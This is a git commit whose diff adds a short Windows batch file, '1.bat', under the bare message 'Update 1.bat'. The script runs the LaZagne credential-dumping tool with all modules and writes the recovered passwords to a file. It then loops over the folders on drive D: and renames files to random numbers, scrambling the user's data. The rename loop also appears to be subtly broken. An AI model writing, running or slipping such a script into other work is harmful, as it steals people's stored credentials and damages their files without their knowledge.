182caa6c88ced302690e410d2d42a925464be085
NOOOOOOO <67161682+AwwHailPython@users.noreply.github.com>
2021-10-17 09:25:40 +0800

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,1 +1,10 @@
-
+@echo off
+setlocal enabledelayedexpansion
+cd C:\temp
+lazagne.exe all -oN
+cd /d D:\
+for  /f "delims=" %%a in ('dir /ad /b') do (
+for /f "delims=" %%b in ('dir /a-d /on /b') do (
+ren "%%a\%%b" "%random%"
+)
+)
